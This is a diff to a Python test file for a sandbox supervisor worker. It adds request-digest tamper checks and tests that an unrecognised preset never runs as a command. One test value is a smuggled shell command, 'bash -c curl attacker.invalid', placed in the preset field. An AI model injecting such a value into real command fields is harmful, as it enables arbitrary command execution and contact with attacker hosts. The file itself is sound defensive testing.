@@ -10,12 +10,12 @@ from runtime.sandbox_supervisor_worker import (
     SandboxSupervisorWorker,
     WorkerConfig,
     _normalize_api_base_url,
+    _request_digest,
     _validate_image_digest,
 )
 
 IMAGE = "ghcr.io/example/calyx-validator@sha256:" + ("a" * 64)
 COMMIT = "b" * 40
-REQUEST_DIGEST = "c" * 64
 TOKEN = "external-supervisor-token-with-thirty-two-plus-bytes"
 
 
@@ -31,19 +31,20 @@ def _config(root: Path) -> WorkerConfig:
     )
 
 
-def _claim(path: str, digest: str) -> dict:
-    return {
+def _claim(path: str, digest: str, *, preset: str = "pytest") -> dict:
+    claim = {
         "request_id": "request-1",
         "repository": "jsp1440/orchid-calyx-backend",
         "branch": "autonomy/example",
         "checkout_commit_sha": COMMIT,
-        "preset": "pytest",
+        "preset": preset,
         "targets": [{"path": path, "sha256": digest}],
         "timeout_seconds": 60,
-        "request_digest": REQUEST_DIGEST,
         "claim_worker": "sandbox-worker-1",
         "claim_token": "claim-token-1",
     }
+    claim["request_digest"] = _request_digest(claim)
+    return claim
 
 
 def test_configuration_requires_https_and_immutable_image() -> None:
@@ -156,13 +157,13 @@ def test_symlink_target_is_rejected_even_when_it_resolves_inside_repository(tmp_
     assert calls == []
 
 
-def test_unrecognized_preset_never_becomes_arbitrary_command(tmp_path: Path) -> None:
+def test_tampered_request_digest_blocks_before_container_execution(tmp_path: Path) -> None:
     target = tmp_path / "tests" / "test_example.py"
     target.parent.mkdir(parents=True)
     target.write_text("def test_ok():\n    assert True\n", encoding="utf-8")
     digest = hashlib.sha256(target.read_bytes()).hexdigest()
     claim = _claim("tests/test_example.py", digest)
-    claim["preset"] = "bash -c curl attacker.invalid"
+    claim["request_digest"] = "f" * 64
     calls = []
 
     worker = SandboxSupervisorWorker(
@@ -171,6 +172,28 @@ def test_unrecognized_preset_never_becomes_arbitrary_command(tmp_path: Path) -> 
         git_head_reader=lambda _: COMMIT,
     )
     receipt = worker._process_claim(claim)
+
+    assert receipt["outcome"] == "blocked"
+    assert calls == []
+
+
+def test_unrecognized_preset_never_becomes_arbitrary_command(tmp_path: Path) -> None:
+    target = tmp_path / "tests" / "test_example.py"
+    target.parent.mkdir(parents=True)
+    target.write_text("def test_ok():\n    assert True\n", encoding="utf-8")
+    digest = hashlib.sha256(target.read_bytes()).hexdigest()
+    calls = []
+
+    def runner(argv, timeout):
+        calls.append((list(argv), timeout))
+        return ProcessResult(return_code=0, stdout=b"probe-ok", stderr=b"")
+
+    worker = SandboxSupervisorWorker(
+        _config(tmp_path), runner=runner, git_head_reader=lambda _: COMMIT
+    )
+    receipt = worker._process_claim(
+        _claim("tests/test_example.py", digest, preset="bash -c curl attacker.invalid")
+    )
 
     assert receipt["outcome"] == "blocked"
     assert len(calls) == 1  # trusted sandbox probe may run; arbitrary preset never does
